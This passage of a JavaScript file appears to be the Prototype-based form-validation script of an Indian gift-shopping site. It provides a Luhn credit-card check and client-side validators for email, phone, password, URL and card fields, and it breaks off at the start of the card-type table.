var slide_on=false;

  var BASE_URL = 'http://india-shopping.khazano.com/';
  var clearenceUrl = 'http://india-shopping.khazano.com/send-gifts-to-india.html';

// Credit Card Validation Javascript
// copyright 12th May 2003, by Stephen Chapman, Felgall Pty Ltd

// You have permission to copy and use this javascript provided that
// the content of the script is not changed in any way.

function validateCreditCard(s) {
    // remove non-numerics
    var v = "0123456789";
    var w = "";
    for (i=0; i < s.length; i++) {
        x = s.charAt(i);
        if (v.indexOf(x,0) != -1)
        w += x;
    }
    // validate number
    j = w.length / 2;
    k = Math.floor(j);
    m = Math.ceil(j) - k;
    c = 0;
    for (i=0; i<k; i++) {
        a = w.charAt(i*2+m) * 2;
        c += a > 9 ? Math.floor(a/10 + a%10) : a;
    }
    for (i=0; i<k+m; i++) c += w.charAt(i*2+1-m) * 1;
    return (c%10 == 0);
}


/*
* Really easy field validation with Prototype
* http://tetlaw.id.au/view/javascript/really-easy-field-validation
* Andrew Tetlaw
* Version 1.5.4.1 (2007-01-05)
*
* Copyright (c) 2007 Andrew Tetlaw
* Permission is hereby granted, free of charge, to any person
* obtaining a copy of this software and associated documentation
* files (the "Software"), to deal in the Software without
* restriction, including without limitation the rights to use, copy,
* modify, merge, publish, distribute, sublicense, and/or sell copies
* of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be
* included in all copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
* EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
* MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
* NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
* BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
* ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
* CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*
*/
var Validator = Class.create();

Validator.prototype = {
    initialize : function(className, error, test, options) {
        if(typeof test == 'function'){
            this.options = $H(options);
            this._test = test;
        } else {
            this.options = $H(test);
            this._test = function(){return true};
        }
        this.error = error || 'Validation failed.';
        this.className = className;
    },
    test : function(v, elm) {
        return (this._test(v,elm) && this.options.all(function(p){
            return Validator.methods[p.key] ? Validator.methods[p.key](v,elm,p.value) : true;
        }));
    }
}
Validator.methods = {
    pattern : function(v,elm,opt) {return Validation.get('IsEmpty').test(v) || opt.test(v)},
    minLength : function(v,elm,opt) {return v.length >= opt},
    maxLength : function(v,elm,opt) {return v.length <= opt},
    min : function(v,elm,opt) {return v >= parseFloat(opt)},
    max : function(v,elm,opt) {return v <= parseFloat(opt)},
    notOneOf : function(v,elm,opt) {return $A(opt).all(function(value) {
        return v != value;
    })},
    oneOf : function(v,elm,opt) {return $A(opt).any(function(value) {
        return v == value;
    })},
    is : function(v,elm,opt) {return v == opt},
    isNot : function(v,elm,opt) {return v != opt},
    equalToField : function(v,elm,opt) {return v == $F(opt)},
    notEqualToField : function(v,elm,opt) {return v != $F(opt)},
    include : function(v,elm,opt) {return $A(opt).all(function(value) {
        return Validation.get(value).test(v,elm);
    })}
}

var Validation = Class.create();
Validation.defaultOptions = {
    onSubmit : true,
    stopOnFirst : false,
    immediate : false,
    focusOnError : true,
    useTitles : false,
    addClassNameToContainer: false,
    containerClassName: '.input-box',
    onFormValidate : function(result, form) {},
    onElementValidate : function(result, elm) {}
};

Validation.prototype = {
    initialize : function(form, options){
        this.form = $(form);
        if (!this.form) {
            return;
        }
        this.options = Object.extend({
            onSubmit : Validation.defaultOptions.onSubmit,
            stopOnFirst : Validation.defaultOptions.stopOnFirst,
            immediate : Validation.defaultOptions.immediate,
            focusOnError : Validation.defaultOptions.focusOnError,
            useTitles : Validation.defaultOptions.useTitles,
            onFormValidate : Validation.defaultOptions.onFormValidate,
            onElementValidate : Validation.defaultOptions.onElementValidate
        }, options || {});
        if(this.options.onSubmit) Event.observe(this.form,'submit',this.onSubmit.bind(this),false);
        if(this.options.immediate) {
            Form.getElements(this.form).each(function(input) { // Thanks Mike!
                if (input.tagName.toLowerCase() == 'select') {
                    Event.observe(input, 'blur', this.onChange.bindAsEventListener(this));
                }
                if (input.type.toLowerCase() == 'radio' || input.type.toLowerCase() == 'checkbox') {
                    Event.observe(input, 'click', this.onChange.bindAsEventListener(this));
                } else {
                    Event.observe(input, 'change', this.onChange.bindAsEventListener(this));
                }
            }, this);
        }
    },
    onChange : function (ev) {
        Validation.isOnChange = true;
        Validation.validate(Event.element(ev),{
                useTitle : this.options.useTitles,
                onElementValidate : this.options.onElementValidate
        });
        Validation.isOnChange = false;
    },
    onSubmit :  function(ev){
        if(!this.validate()) Event.stop(ev);
    },
    validate : function() {
        var result = false;
        var useTitles = this.options.useTitles;
        var callback = this.options.onElementValidate;
        try {
            if(this.options.stopOnFirst) {
                result = Form.getElements(this.form).all(function(elm) {
                    if (elm.hasClassName('local-validation') && !this.isElementInForm(elm, this.form)) {
                        return true;
                    }
                    return Validation.validate(elm,{useTitle : useTitles, onElementValidate : callback});
                }, this);
            } else {
                result = Form.getElements(this.form).collect(function(elm) {
                    if (elm.hasClassName('local-validation') && !this.isElementInForm(elm, this.form)) {
                        return true;
                    }
                    return Validation.validate(elm,{useTitle : useTitles, onElementValidate : callback});
                }, this).all();
            }
        } catch (e) {
        }
        if(!result && this.options.focusOnError) {
            try{
                Form.getElements(this.form).findAll(function(elm){return $(elm).hasClassName('validation-failed')}).first().focus()
            }
            catch(e){
            }
        }
        this.options.onFormValidate(result, this.form);
        return result;
    },
    reset : function() {
        Form.getElements(this.form).each(Validation.reset);
    },
    isElementInForm : function(elm, form) {
        var domForm = elm.up('form');
        if (domForm == form) {
            return true;
        }
        return false;
    }
}

Object.extend(Validation, {
    validate : function(elm, options){
        options = Object.extend({
            useTitle : false,
            onElementValidate : function(result, elm) {}
        }, options || {});
        elm = $(elm);

        var cn = $w(elm.className);
        return result = cn.all(function(value) {
            var test = Validation.test(value,elm,options.useTitle);
            options.onElementValidate(test, elm);
            return test;
        });
    },
    insertAdvice : function(elm, advice){
        var container = $(elm).up('.field-row');
        if(container){
            Element.insert(container, {after: advice});
        } else if (elm.up('td.value')) {
            elm.up('td.value').insert({bottom: advice});
        } else if (elm.advaiceContainer && $(elm.advaiceContainer)) {
            $(elm.advaiceContainer).update(advice);
        }
        else {
            switch (elm.type.toLowerCase()) {
                case 'checkbox':
                case 'radio':
                    var p = elm.parentNode;
                    if(p) {
                        Element.insert(p, {'bottom': advice});
                    } else {
                        Element.insert(elm, {'after': advice});
                    }
                    break;
                default:
                    Element.insert(elm, {'after': advice});
            }
        }
    },
    showAdvice : function(elm, advice, adviceName){
        if(!elm.advices){
            elm.advices = new Hash();
        }
        else{
            elm.advices.each(function(pair){
                if (!advice || pair.value.id != advice.id) {
                    // hide non-current advice after delay
                    this.hideAdvice(elm, pair.value);
                }
            }.bind(this));
        }
        elm.advices.set(adviceName, advice);
        if(typeof Effect == 'undefined') {
            advice.style.display = 'block';
        } else {
            if(!advice._adviceAbsolutize) {
                new Effect.Appear(advice, {duration : 1 });
            } else {
                Position.absolutize(advice);
                advice.show();
                advice.setStyle({
                    'top':advice._adviceTop,
                    'left': advice._adviceLeft,
                    'width': advice._adviceWidth,
                    'z-index': 1000
                });
                advice.addClassName('advice-absolute');
            }
        }
    },
    hideAdvice : function(elm, advice){
        if (advice != null) {
            new Effect.Fade(advice, {duration : 1, afterFinishInternal : function() {advice.hide();}});
        }
    },
    updateCallback : function(elm, status) {
        if (typeof elm.callbackFunction != 'undefined') {
            eval(elm.callbackFunction+'(\''+elm.id+'\',\''+status+'\')');
        }
    },
    ajaxError : function(elm, errorMsg) {
        var name = 'validate-ajax';
        var advice = Validation.getAdvice(name, elm);
        if (advice == null) {
            advice = this.createAdvice(name, elm, false, errorMsg);
        }
        this.showAdvice(elm, advice, 'validate-ajax');
        this.updateCallback(elm, 'failed');

        elm.addClassName('validation-failed');
        elm.addClassName('validate-ajax');
        if (Validation.defaultOptions.addClassNameToContainer && Validation.defaultOptions.containerClassName != '') {
            var container = elm.up(Validation.defaultOptions.containerClassName);
            if (container && this.allowContainerClassName(elm)) {
                container.removeClassName('validation-passed');
                container.addClassName('validation-error');
            }
        }
    },
    allowContainerClassName: function (elm) {
        if (elm.type == 'radio' || elm.type == 'checkbox') {
            return elm.hasClassName('change-container-classname');
        }

        return true;
    },
    test : function(name, elm, useTitle) {
        var v = Validation.get(name);
        var prop = '__advice'+name.camelize();
        try {
        if(Validation.isVisible(elm) && !v.test($F(elm), elm)) {
            //if(!elm[prop]) {
                var advice = Validation.getAdvice(name, elm);
                if (advice == null) {
                    advice = this.createAdvice(name, elm, useTitle);
                }
                this.showAdvice(elm, advice, name);
                this.updateCallback(elm, 'failed');
            //}
            elm[prop] = 1;
            if (!elm.advaiceContainer) {
                elm.removeClassName('validation-passed');
                elm.addClassName('validation-failed');
            }

           if (Validation.defaultOptions.addClassNameToContainer && Validation.defaultOptions.containerClassName != '') {
                var container = elm.up(Validation.defaultOptions.containerClassName);
                if (container && this.allowContainerClassName(elm)) {
                    container.removeClassName('validation-passed');
                    container.addClassName('validation-error');
                }
            }
            return false;
        } else {
            var advice = Validation.getAdvice(name, elm);
            this.hideAdvice(elm, advice);
            this.updateCallback(elm, 'passed');
            elm[prop] = '';
            elm.removeClassName('validation-failed');
            elm.addClassName('validation-passed');
            if (Validation.defaultOptions.addClassNameToContainer && Validation.defaultOptions.containerClassName != '') {
                var container = elm.up(Validation.defaultOptions.containerClassName);
                if (container && !container.down('.validation-failed') && this.allowContainerClassName(elm)) {
                    if (!Validation.get('IsEmpty').test(elm.value) || !this.isVisible(elm)) {
                        container.addClassName('validation-passed');
                    } else {
                        container.removeClassName('validation-passed');
                    }
                    container.removeClassName('validation-error');
                }
            }
            return true;
        }
        } catch(e) {
            throw(e)
        }
    },
    isVisible : function(elm) {
        while(elm.tagName != 'BODY') {
            if(!$(elm).visible()) return false;
            elm = elm.parentNode;
        }
        return true;
    },
    getAdvice : function(name, elm) {
        return $('advice-' + name + '-' + Validation.getElmID(elm)) || $('advice-' + Validation.getElmID(elm));
    },
    createAdvice : function(name, elm, useTitle, customError) {
        var v = Validation.get(name);
        var errorMsg = useTitle ? ((elm && elm.title) ? elm.title : v.error) : v.error;
        if (customError) {
            errorMsg = customError;
        }
        try {
            if (Translator){
                errorMsg = Translator.translate(errorMsg);
            }
        }
        catch(e){}

        advice = '<div class="validation-advice" id="advice-' + name + '-' + Validation.getElmID(elm) +'" style="display:none">' + errorMsg + '</div>'


        Validation.insertAdvice(elm, advice);
        advice = Validation.getAdvice(name, elm);
        if($(elm).hasClassName('absolute-advice')) {
            var dimensions = $(elm).getDimensions();
            var originalPosition = Position.cumulativeOffset(elm);

            advice._adviceTop = (originalPosition[1] + dimensions.height) + 'px';
            advice._adviceLeft = (originalPosition[0])  + 'px';
            advice._adviceWidth = (dimensions.width)  + 'px';
            advice._adviceAbsolutize = true;
        }
        return advice;
    },
    getElmID : function(elm) {
        return elm.id ? elm.id : elm.name;
    },
    reset : function(elm) {
        elm = $(elm);
        var cn = $w(elm.className);
        cn.each(function(value) {
            var prop = '__advice'+value.camelize();
            if(elm[prop]) {
                var advice = Validation.getAdvice(value, elm);
                if (advice) {
                    advice.hide();
                }
                elm[prop] = '';
            }
            elm.removeClassName('validation-failed');
            elm.removeClassName('validation-passed');
            if (Validation.defaultOptions.addClassNameToContainer && Validation.defaultOptions.containerClassName != '') {
                var container = elm.up(Validation.defaultOptions.containerClassName);
                if (container) {
                    container.removeClassName('validation-passed');
                    container.removeClassName('validation-error');
                }
            }
        });
    },
    add : function(className, error, test, options) {
        var nv = {};
        nv[className] = new Validator(className, error, test, options);
        Object.extend(Validation.methods, nv);
    },
    addAllThese : function(validators) {
        var nv = {};
        $A(validators).each(function(value) {
                nv[value[0]] = new Validator(value[0], value[1], value[2], (value.length > 3 ? value[3] : {}));
            });
        Object.extend(Validation.methods, nv);
    },
    get : function(name) {
        return  Validation.methods[name] ? Validation.methods[name] : Validation.methods['_LikeNoIDIEverSaw_'];
    },
    methods : {
        '_LikeNoIDIEverSaw_' : new Validator('_LikeNoIDIEverSaw_','',{})
    }
});

Validation.add('IsEmpty', '', function(v) {
    return  (v == '' || (v == null) || (v.length == 0) || /^\s+$/.test(v));
});

Validation.addAllThese([
    ['validate-no-html-tags', 'HTML tags are not allowed', function(v) {
				return !/<(\/)?\w+/.test(v);
			}],
	['validate-select', 'Please select an option.', function(v) {
                return ((v != "none") && (v != null) && (v.length != 0));
            }],
    ['required-entry', 'This is a required field.', function(v) {
                return !Validation.get('IsEmpty').test(v);
            }],
    ['validate-number', 'Please enter a valid number in this field.', function(v) {
                return Validation.get('IsEmpty').test(v)
                    || (!isNaN(parseNumber(v)) && /^\s*-?\d*(\.\d*)?\s*$/.test(v));
            }],
    ['validate-number-range', 'The value is not within the specified range.', function(v, elm) {
                if (Validation.get('IsEmpty').test(v)) {
                    return true;
                }

                var numValue = parseNumber(v);
                if (isNaN(numValue)) {
                    return false;
                }

                var reRange = /^number-range-(-?[\d.,]+)?-(-?[\d.,]+)?$/,
                    result = true;

                $w(elm.className).each(function(name) {
                    var m = reRange.exec(name);
                    if (m) {
                        result = result
                            && (m[1] == null || m[1] == '' || numValue >= parseNumber(m[1]))
                            && (m[2] == null || m[2] == '' || numValue <= parseNumber(m[2]));
                    }
                });

                return result;
            }],
    ['validate-digits', 'Please use numbers only in this field. Please avoid spaces or other characters such as dots or commas.', function(v) {
                return Validation.get('IsEmpty').test(v) ||  !/[^\d]/.test(v);
            }],
    ['validate-digits-range', 'The value is not within the specified range.', function(v, elm) {
                if (Validation.get('IsEmpty').test(v)) {
                    return true;
                }

                var numValue = parseNumber(v);
                if (isNaN(numValue)) {
                    return false;
                }

                var reRange = /^digits-range-(-?\d+)?-(-?\d+)?$/,
                    result = true;

                $w(elm.className).each(function(name) {
                    var m = reRange.exec(name);
                    if (m) {
                        result = result
                            && (m[1] == null || m[1] == '' || numValue >= parseNumber(m[1]))
                            && (m[2] == null || m[2] == '' || numValue <= parseNumber(m[2]));
                    }
                });

                return result;
            }],
    ['validate-alpha', 'Please use letters only (a-z or A-Z) in this field.', function (v) {
                return Validation.get('IsEmpty').test(v) ||  /^[a-zA-Z]+$/.test(v)
            }],
    ['validate-code', 'Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.', function (v) {
                return Validation.get('IsEmpty').test(v) ||  /^[a-z]+[a-z0-9_]+$/.test(v)
            }],
    ['validate-alphanum', 'Please use only letters (a-z or A-Z) or numbers (0-9) only in this field. No spaces or other characters are allowed.', function(v) {
                return Validation.get('IsEmpty').test(v) || /^[a-zA-Z0-9]+$/.test(v)
            }],
    ['validate-alphanum-with-spaces', 'Please use only letters (a-z or A-Z), numbers (0-9) or spaces only in this field.', function(v) {
                    return Validation.get('IsEmpty').test(v) || /^[a-zA-Z0-9 ]+$/.test(v)
            }],
    ['validate-street', 'Please use only letters (a-z or A-Z) or numbers (0-9) or spaces and # only in this field.', function(v) {
                return Validation.get('IsEmpty').test(v) ||  /^[ \w]{3,}([A-Za-z]\.)?([ \w]*\#\d+)?(\r\n| )[ \w]{3,}/.test(v)
            }],
    ['validate-phoneStrict', 'Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.', function(v) {
                return Validation.get('IsEmpty').test(v) || /^(\()?\d{3}(\))?(-|\s)?\d{3}(-|\s)\d{4}$/.test(v);
            }],
    ['validate-phoneLax', 'Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.', function(v) {
                return Validation.get('IsEmpty').test(v) || /^((\d[-. ]?)?((\(\d{3}\))|\d{3}))?[-. ]?\d{3}[-. ]?\d{4}$/.test(v);
            }],
    ['validate-fax', 'Please enter a valid fax number. For example (123) 456-7890 or 123-456-7890.', function(v) {
                return Validation.get('IsEmpty').test(v) || /^(\()?\d{3}(\))?(-|\s)?\d{3}(-|\s)\d{4}$/.test(v);
            }],
    ['validate-date', 'Please enter a valid date.', function(v) {
                var test = new Date(v);
                return Validation.get('IsEmpty').test(v) || !isNaN(test);
            }],
    ['validate-email', 'Please enter a valid email address. For example johndoe@domain.com.', function (v) {
                //return Validation.get('IsEmpty').test(v) || /\w{1,}[@][\w\-]{1,}([.]([\w\-]{1,})){1,3}$/.test(v)
                //return Validation.get('IsEmpty').test(v) || /^[\!\#$%\*/?|\^\{\}`~&\'\+\-=_a-z0-9][\!\#$%\*/?|\^\{\}`~&\'\+\-=_a-z0-9\.]{1,30}[\!\#$%\*/?|\^\{\}`~&\'\+\-=_a-z0-9]@([a-z0-9_-]{1,30}\.){1,5}[a-z]{2,4}$/i.test(v)
                return Validation.get('IsEmpty').test(v) || /^([a-z0-9,!\#\$%&'\*\+\/=\?\^_`\{\|\}~-]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z0-9,!\#\$%&'\*\+\/=\?\^_`\{\|\}~-]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*@([a-z0-9-]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z0-9-]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*\.(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]){2,})$/i.test(v)
            }],
    ['validate-emailSender', 'Please use only visible characters and spaces.', function (v) {
                return Validation.get('IsEmpty').test(v) ||  /^[\S ]+$/.test(v)
                    }],
    ['validate-password', 'Please enter 6 or more characters. Leading or trailing spaces will be ignored.', function(v) {
                var pass=v.strip(); /*strip leading and trailing spaces*/
                return !(pass.length>0 && pass.length < 6);
            }],
    ['validate-admin-password', 'Please enter 7 or more characters. Password should contain both numeric and alphabetic characters.', function(v) {
                var pass=v.strip();
                if (0 == pass.length) {
                    return true;
                }
                if (!(/[a-z]/i.test(v)) || !(/[0-9]/.test(v))) {
                    return false;
                }
                return !(pass.length < 7);
            }],
    ['validate-cpassword', 'Please make sure your passwords match.', function(v) {
                var conf = $('confirmation') ? $('confirmation') : $$('.validate-cpassword')[0];
                var pass = false;
                if ($('password')) {
                    pass = $('password');
                }
                var passwordElements = $$('.validate-password');
                for (var i = 0; i < passwordElements.size(); i++) {
                    var passwordElement = passwordElements[i];
                    if (passwordElement.up('form').id == conf.up('form').id) {
                        pass = passwordElement;
                    }
                }
                if ($$('.validate-admin-password').size()) {
                    pass = $$('.validate-admin-password')[0];
                }
                return (pass.value == conf.value);
            }],
    ['validate-url', 'Please enter a valid URL. Protocol is required (http://, https:// or ftp://)', function (v) {
                v = (v || '').replace(/^\s+/, '').replace(/\s+$/, '');
                return Validation.get('IsEmpty').test(v) || /^(http|https|ftp):\/\/(([A-Z0-9]([A-Z0-9_-]*[A-Z0-9]|))(\.[A-Z0-9]([A-Z0-9_-]*[A-Z0-9]|))*)(:(\d+))?(\/[A-Z0-9~](([A-Z0-9_~-]|\.)*[A-Z0-9~]|))*\/?(.*)?$/i.test(v)
            }],
    ['validate-clean-url', 'Please enter a valid URL. For example http://www.example.com or www.example.com', function (v) {
                return Validation.get('IsEmpty').test(v) || /^(http|https|ftp):\/\/(([A-Z0-9][A-Z0-9_-]*)(\.[A-Z0-9][A-Z0-9_-]*)+.(com|org|net|dk|at|us|tv|info|uk|co.uk|biz|se)$)(:(\d+))?\/?/i.test(v) || /^(www)((\.[A-Z0-9][A-Z0-9_-]*)+.(com|org|net|dk|at|us|tv|info|uk|co.uk|biz|se)$)(:(\d+))?\/?/i.test(v)
            }],
    ['validate-identifier', 'Please enter a valid URL Key. For example "example-page", "example-page.html" or "anotherlevel/example-page".', function (v) {
                return Validation.get('IsEmpty').test(v) || /^[a-z0-9][a-z0-9_\/-]+(\.[a-z0-9_-]+)?$/.test(v)
            }],
    ['validate-xml-identifier', 'Please enter a valid XML-identifier. For example something_1, block5, id-4.', function (v) {
                return Validation.get('IsEmpty').test(v) || /^[A-Z][A-Z0-9_\/-]*$/i.test(v)
            }],
    ['validate-ssn', 'Please enter a valid social security number. For example 123-45-6789.', function(v) {
            return Validation.get('IsEmpty').test(v) || /^\d{3}-?\d{2}-?\d{4}$/.test(v);
            }],
    ['validate-zip', 'Please enter a valid zip code. For example 90602 or 90602-1234.', function(v) {
            return Validation.get('IsEmpty').test(v) || /(^\d{5}$)|(^\d{5}-\d{4}$)/.test(v);
            }],
    ['validate-zip-international', 'Please enter a valid zip code.', function(v) {
            //return Validation.get('IsEmpty').test(v) || /(^[A-z0-9]{2,10}([\s]{0,1}|[\-]{0,1})[A-z0-9]{2,10}$)/.test(v);
            return true;
            }],
    ['validate-date-au', 'Please use this date format: dd/mm/yyyy. For example 17/03/2006 for the 17th of March, 2006.', function(v) {
                if(Validation.get('IsEmpty').test(v)) return true;
                var regex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
                if(!regex.test(v)) return false;
                var d = new Date(v.replace(regex, '$2/$1/$3'));
                return ( parseInt(RegExp.$2, 10) == (1+d.getMonth()) ) &&
                            (parseInt(RegExp.$1, 10) == d.getDate()) &&
                            (parseInt(RegExp.$3, 10) == d.getFullYear() );
            }],
    ['validate-currency-dollar', 'Please enter a valid $ amount. For example $100.00.', function(v) {
                // [$]1[##][,###]+[.##]
                // [$]1###+[.##]
                // [$]0.##
                // [$].##
                return Validation.get('IsEmpty').test(v) ||  /^\$?\-?([1-9]{1}[0-9]{0,2}(\,[0-9]{3})*(\.[0-9]{0,2})?|[1-9]{1}\d*(\.[0-9]{0,2})?|0(\.[0-9]{0,2})?|(\.[0-9]{1,2})?)$/.test(v)
            }],
    ['validate-one-required', 'Please select one of the above options.', function (v,elm) {
                var p = elm.parentNode;
                var options = p.getElementsByTagName('INPUT');
                return $A(options).any(function(elm) {
                    return $F(elm);
                });
            }],
    ['validate-one-required-by-name', 'Please select one of the options.', function (v,elm) {
                var inputs = $$('input[name="' + elm.name.replace(/([\\"])/g, '\\$1') + '"]');

                var error = 1;
                for(var i=0;i<inputs.length;i++) {
                    if((inputs[i].type == 'checkbox' || inputs[i].type == 'radio') && inputs[i].checked == true) {
                        error = 0;
                    }

                    if(Validation.isOnChange && (inputs[i].type == 'checkbox' || inputs[i].type == 'radio')) {
                        Validation.reset(inputs[i]);
                    }
                }

                if( error == 0 ) {
                    return true;
                } else {
                    return false;
                }
            }],
    ['validate-not-negative-number', 'Please enter a number 0 or greater in this field.', function(v) {
                if (Validation.get('IsEmpty').test(v)) {
                    return true;
                }
                v = parseNumber(v);
                return !isNaN(v) && v >= 0;
            }],
    ['validate-zero-or-greater', 'Please enter a number 0 or greater in this field.', function(v) {
            return Validation.get('validate-not-negative-number').test(v);
        }],
    ['validate-greater-than-zero', 'Please enter a number greater than 0 in this field.', function(v) {
            if (Validation.get('IsEmpty').test(v)) {
                return true;
            }
            v = parseNumber(v);
            return !isNaN(v) && v > 0;
        }],
    ['validate-state', 'Please select State/Province.', function(v) {
                return (v!=0 || v == '');
            }],
    ['validate-new-password', 'Please enter 6 or more characters. Leading or trailing spaces will be ignored.', function(v) {
                if (!Validation.get('validate-password').test(v)) return false;
                if (Validation.get('IsEmpty').test(v) && v != '') return false;
                return true;
            }],
    ['validate-cc-number', 'Please enter a valid credit card number.', function(v, elm) {
                // remove non-numerics
                var ccTypeContainer = $(elm.id.substr(0,elm.id.indexOf('_cc_number')) + '_cc_type');
                if (ccTypeContainer && typeof Validation.creditCartTypes.get(ccTypeContainer.value) != 'undefined'
                        && Validation.creditCartTypes.get(ccTypeContainer.value)[2] == false) {
                    if (!Validation.get('IsEmpty').test(v) && Validation.get('validate-digits').test(v)) {
                        return true;
                    } else {
                        return false;
                    }
                }
                return validateCreditCard(v);
            }],
    ['validate-cc-type', 'Credit card number does not match credit card type.', function(v, elm) {
                // remove credit card number delimiters such as "-" and space
                elm.value = removeDelimiters(elm.value);
                v         = removeDelimiters(v);

                var ccTypeContainer = $(elm.id.substr(0,elm.id.indexOf('_cc_number')) + '_cc_type');
                if (!ccTypeContainer) {
                    return true;
                }
                var ccType = ccTypeContainer.value;

                if (typeof Validation.creditCartTypes.get(ccType) == 'undefined') {
                    return false;
                }

                // Other card type or switch or solo card
                if (Validation.creditCartTypes.get(ccType)[0]==false) {
                    return true;
                }

                // Matched credit card type
                var ccMatchedType = '';

                Validation.creditCartTypes.each(function (pair) {
                    if (pair.value[0] && v.match(pair.value[0])) {
                        ccMatchedType = pair.key;
                        throw $break;
                    }
                });

                if(ccMatchedType != ccType) {
                    return false;
                }

                if (ccTypeContainer.hasClassName('validation-failed') && Validation.isOnChange) {
                    Validation.validate(ccTypeContainer);
                }

                return true;
            }],
     ['validate-cc-type-select', 'Card type does not match credit card number.', function(v, elm) {
                var ccNumberContainer = $(elm.id.substr(0,elm.id.indexOf('_cc_type')) + '_cc_number');
                if (Validation.isOnChange && Validation.get('IsEmpty').test(ccNumberContainer.value)) {
                    return true;
                }
                if (Validation.get('validate-cc-type').test(ccNumberContainer.value, ccNumberContainer)) {
                    Validation.validate(ccNumberContainer);
                }
                return Validation.get('validate-cc-type').test(ccNumberContainer.value, ccNumberContainer);
            }],
     ['validate-cc-exp', 'Incorrect credit card expiration date.', function(v, elm) {
                var ccExpMonth   = v;
                var ccExpYear    = $(elm.id.substr(0,elm.id.indexOf('_expiration')) + '_expiration_yr').value;
                var currentTime  = new Date();
                var currentMonth = currentTime.getMonth() + 1;
                var currentYear  = currentTime.getFullYear();
                if (ccExpMonth < currentMonth && ccExpYear == currentYear) {
                    return false;
                }
                return true;
            }],
     ['validate-cc-cvn', 'Please enter a valid credit card verification number.', function(v, elm) {
                var ccTypeContainer = $(elm.id.substr(0,elm.id.indexOf('_cc_cid')) + '_cc_type');
                if (!ccTypeContainer) {
                    return true;
                }
                var ccType = ccTypeContainer.value;

                if (typeof Validation.creditCartTypes.get(ccType) == 'undefined') {
                    return false;
                }

                var re = Validation.creditCartTypes.get(ccType)[1];

                if (v.match(re)) {
                    return true;
                }

                return false;
            }],
     ['validate-ajax', '', function(v, elm) { return true; }],
     ['validate-data', 'Please use only letters (a-z or A-Z), numbers (0-9) or underscore(_) in this field, first character should be a letter.', function (v) {
                if(v != '' && v) {
                    return /^[A-Za-z]+[A-Za-z0-9_]+$/.test(v);
                }
                return true;
            }],
     ['validate-css-length', 'Please input a valid CSS-length. For example 100px or 77pt or 20em or .5ex or 50%.', function (v) {
                if (v != '' && v) {
                    return /^[0-9\.]+(px|pt|em|ex|%)?$/.test(v) && (!(/\..*\./.test(v))) && !(/\.$/.test(v));
                }
                return true;
            }],
     ['validate-length', 'Text length does not satisfy specified text range.', function (v, elm) {
                var reMax = new RegExp(/^maximum-length-[0-9]+$/);
                var reMin = new RegExp(/^minimum-length-[0-9]+$/);
                var result = true;
                $w(elm.className).each(function(name, index) {
                    if (name.match(reMax) && result) {
                       var length = name.split('-')[2];
                       result = (v.length <= length);
                    }
                    if (name.match(reMin) && result && !Validation.get('IsEmpty').test(v)) {
                        var length = name.split('-')[2];
                        result = (v.length >= length);
                    }
                });
                return result;
            }],
     ['validate-percents', 'Please enter a number lower than 100.', {max:100}],
     ['required-file', 'Please select a file', function(v, elm) {
         var result = !Validation.get('IsEmpty').test(v);
         if (result === false) {
             ovId = elm.id + '_value';
             if ($(ovId)) {
                 result = !Validation.get('IsEmpty').test($(ovId).value);
             }
         }
         return result;
     }],
     ['validate-cc-ukss', 'Please enter issue number or start date for switch/solo card type.', function(v,elm) {
         var endposition;

         if (elm.id.match(/(.)+_cc_issue$/)) {
             endposition = elm.id.indexOf('_cc_issue');
         } else if (elm.id.match(/(.)+_start_month$/)) {
             endposition = elm.id.indexOf('_start_month');
         } else {
             endposition = elm.id.indexOf('_start_year');
         }

         var prefix = elm.id.substr(0,endposition);

         var ccTypeContainer = $(prefix + '_cc_type');

         if (!ccTypeContainer) {
               return true;
         }
         var ccType = ccTypeContainer.value;

         if(['SS','SM','SO'].indexOf(ccType) == -1){
             return true;
         }

         $(prefix + '_cc_issue').advaiceContainer
           = $(prefix + '_start_month').advaiceContainer
           = $(prefix + '_start_year').advaiceContainer
           = $(prefix + '_cc_type_ss_div').down('ul li.adv-container');

         var ccIssue   =  $(prefix + '_cc_issue').value;
         var ccSMonth  =  $(prefix + '_start_month').value;
         var ccSYear   =  $(prefix + '_start_year').value;

         var ccStartDatePresent = (ccSMonth && ccSYear) ? true : false;

         if (!ccStartDatePresent && !ccIssue){
             return false;
         }
         return true;
     }]
]);

function removeDelimiters (v) {
    v = v.replace(/\s/g, '');
    v = v.replace(/\-/g, '');
    return v;
}

function parseNumber(v)
{
    if (typeof v != 'string') {
        return parseFloat(v);
    }

    var isDot  = v.indexOf('.');
    var isComa = v.indexOf(',');

    if (isDot != -1 && isComa != -1) {
        if (isComa > isDot) {
            v = v.replace('.', '').replace(',', '.');
        }
        else {
            v = v.replace(',', '');
        }
    }
    else if (isComa != -1) {
        v = v.replace(',', '.');
    }

    return parseFloat(v);
}

/**
 * Hash with credit card types which can be simply extended in payment modules
 * 0 - regexp for card number
 * 1 - regexp for cvn
 * 2 - check or not credit card number trough Luhn algorithm by
 *     function validateCreditCard which you can find above in this file
 */
Validation.creditCartTypes = $H({
